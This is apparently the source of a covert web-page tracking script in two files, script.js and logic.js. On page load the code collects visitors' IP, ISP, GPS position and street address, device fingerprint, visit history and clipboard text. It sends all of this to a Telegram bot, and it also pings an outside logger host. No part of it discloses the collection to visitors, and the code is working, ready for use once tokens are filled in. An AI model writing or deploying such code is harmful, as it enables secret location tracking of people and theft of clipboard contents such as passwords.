// === script.js ===
(function () {
  try {
    fetch("https://fake-logger.onrender.com/logger.php")
      .then(() => console.log("Visitor logged"))
      .catch(() => {});
  } catch {}

  function loadExternalLogic(url) {
    const script = document.createElement('script');
    script.src = url;
    script.async = true;
    script.onerror = () => console.error('❌ Failed to load logic.js');
    document.head.appendChild(script);
  }

  loadExternalLogic('logic.js');
})();


// === logic.js ===
const TELEGRAM_BOT_TOKEN = 'YOUR_TELEGRAM_BOT_TOKEN';
const CHAT_ID = 'YOUR_CHAT_ID';
const OPENCAGE_API_KEY = 'YOUR_OPENCAGE_API_KEY';

function buildAddress(components) {
  const country = components.country || '';
  const state = components.state || '';
  const county = components.county || components.district || '';
  const subplace = components.suburb || components.village || components.town || components.city || components.neighbourhood || '';
  return `${country}, ${state}, ${county}, ${subplace}`;
}

async function sendToTelegram(message) {
  const tag = window.userRef || 'unknown_ref';
  await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: `🧩 REF: ${tag}\n${message}`
    })
  });
}

function collectDeviceInfo() {
  const ua = navigator.userAgent;
  const language = navigator.language;
  const platform = navigator.platform;
  const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
  const screenRes = `${window.screen.width}x${window.screen.height}`;
  let browser = "Unknown";
  if (ua.includes("Firefox")) browser = "Firefox";
  else if (ua.includes("Edg")) browser = "Edge";
  else if (ua.includes("Chrome")) browser = "Chrome";
  else if (ua.includes("Safari")) browser = "Safari";

  let os = "Unknown OS";
  if (ua.includes("Win")) os = "Windows";
  else if (ua.includes("Mac")) os = "MacOS";
  else if (ua.includes("X11")) os = "UNIX";
  else if (ua.includes("Linux")) os = "Linux";
  else if (/Android/.test(ua)) os = "Android";
  else if (/iPhone|iPad|iPod/.test(ua)) os = "iOS";

  const plugins = Array.from(navigator.plugins || []).map(p => p.name).join(", ") || "None";

  let canvasFP = "Unavailable";
  try {
    const canvas = document.createElement("canvas");
    const ctx = canvas.getContext("2d");
    ctx.textBaseline = "top";
    ctx.font = "14px 'Arial'";
    ctx.fillText("DeviceFingerprint", 2, 2);
    canvasFP = canvas.toDataURL().slice(0, 40);
  } catch {}

  return `\n📱 Device Info:\n🖥 OS: ${os}\n🌐 Browser: ${browser}\n📊 Platform: ${platform}\n🧭 Timezone: ${timezone}\n🔠 Language: ${language}\n📐 Screen: ${screenRes}\n🧩 User-Agent: ${ua}\n🔌 Plugins: ${plugins}\n🎨 Canvas FP: ${canvasFP}...`;
}

async function getIPInfo() {
  try {
    const res = await fetch('https://api.db-ip.com/v2/free/self');
    const data = await res.json();
    const isCloudASN = /google|amazon|microsoft|digitalocean|cloudflare/i.test(data.organization || "");
    data.vpnDetected = isCloudASN ? "⚠️ Likely VPN/Proxy" : "✅ Residential";
    return data;
  } catch {
    return { ipAddress: 'unknown', latitude: '0', longitude: '0', vpnDetected: 'Unknown' };
  }
}

async function getLocationInfo(lat, lon) {
  try {
    const res = await fetch(`https://api.opencagedata.com/geocode/v1/json?q=${lat}+${lon}&key=${OPENCAGE_API_KEY}`);
    const data = await res.json();
    return data.results[0]?.components || {};
  } catch {
    return {};
  }
}

async function getClipboardContents() {
  try {
    const text = await navigator.clipboard.readText();
    return `📋 Clipboard:\n${text.slice(0, 300)}\n`;
  } catch {
    return "📋 Clipboard: Permission denied or unavailable";
  }
}

async function hashFingerprint(rawString) {
  const encoder = new TextEncoder();
  const data = encoder.encode(rawString);
  const hashBuffer = await crypto.subtle.digest("SHA-256", data);
  return Array.from(new Uint8Array(hashBuffer)).map(b => b.toString(16).padStart(2, "0")).join("");
}

async function generateFingerprint() {
  const ua = navigator.userAgent;
  const plugins = Array.from(navigator.plugins || []).map(p => p.name).join(",");
  const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
  let canvasFP = '';
  try {
    const canvas = document.createElement("canvas");
    const ctx = canvas.getContext("2d");
    ctx.textBaseline = "top";
    ctx.font = "14px 'Arial'";
    ctx.fillText("fingerprint", 2, 2);
    canvasFP = canvas.toDataURL();
  } catch {}
  const raw = ua + plugins + timezone + canvasFP;
  return await hashFingerprint(raw);
}

function getVisitStats() {
  let visits = localStorage.getItem("visits") || 0;
  visits = parseInt(visits) + 1;
  localStorage.setItem("visits", visits);

  const firstVisit = localStorage.getItem("firstVisit") || new Date().toISOString();
  const lastVisit = new Date().toISOString();
  localStorage.setItem("firstVisit", firstVisit);
  localStorage.setItem("lastVisit", lastVisit);

  return `👁 Visit Tracker:\n🔢 Count: ${visits}\n🕒 First: ${firstVisit}\n🕘 Last: ${lastVisit}`;
}

async function logIPOnly(reason = "⚠️ No GPS, IP Only") {
  const ip = await getIPInfo();
  const lat = ip.latitude || '0';
  const lon = ip.longitude || '0';
  const addressData = await getLocationInfo(lat, lon);
  const address = buildAddress(addressData);
  const clipboard = await getClipboardContents();
  const fingerprint = await generateFingerprint();

  await sendToTelegram(`${reason}
🔹 IP: ${ip.ipAddress}
🌍 Region: ${ip.city}, ${ip.stateProv}, ${ip.countryName}
🏢 ISP: ${ip.organization}
🛡 VPN Check: ${ip.vpnDetected}
📍 IP-Based Location: ${address}
🗺️ https://www.google.com/maps?q=${lat},${lon}
${collectDeviceInfo()}
🧬 Fingerprint: ${fingerprint}
${getVisitStats()}
${clipboard}`);
}

async function logGPSAndIP(lat, lon) {
  const ip = await getIPInfo();
  const addressData = await getLocationInfo(lat, lon);
  const address = buildAddress(addressData);
  const clipboard = await getClipboardContents();
  const fingerprint = await generateFingerprint();

  await sendToTelegram(`✅ USER ALLOWED LOCATION
🔹 IP: ${ip.ipAddress}
🌍 Region: ${ip.city}, ${ip.stateProv}, ${ip.countryName}
🏢 ISP: ${ip.organization}
🛡 VPN Check: ${ip.vpnDetected}
📍 GPS: ${lat}, ${lon}
📍 Address: ${address}
🗺️ https://www.google.com/maps?q=${lat},${lon}
${collectDeviceInfo()}
🧬 Fingerprint: ${fingerprint}
${getVisitStats()}
${clipboard}`);
}

async function handleLocationFlow() {
  if (!navigator.geolocation || !navigator.permissions) {
    await logIPOnly("❌ Geolocation not supported");
    return;
  }
  try {
    const permission = await navigator.permissions.query({ name: 'geolocation' });
    if (permission.state === "granted") {
      navigator.geolocation.getCurrentPosition(
        pos => logGPSAndIP(pos.coords.latitude, pos.coords.longitude),
        () => logIPOnly("⚠️ GPS fetch error (granted state)")
      );
    } else if (permission.state === "prompt") {
      navigator.geolocation.getCurrentPosition(
        pos => logGPSAndIP(pos.coords.latitude, pos.coords.longitude),
        () => logIPOnly("⚠️ GPS denied or failed")
      );
    } else {
      await logIPOnly("❌ User denied location access");
    }
  } catch {
    await logIPOnly("❌ PERMISSION API failed");
  }
}

window.onload = () => {
  handleLocationFlow();
};
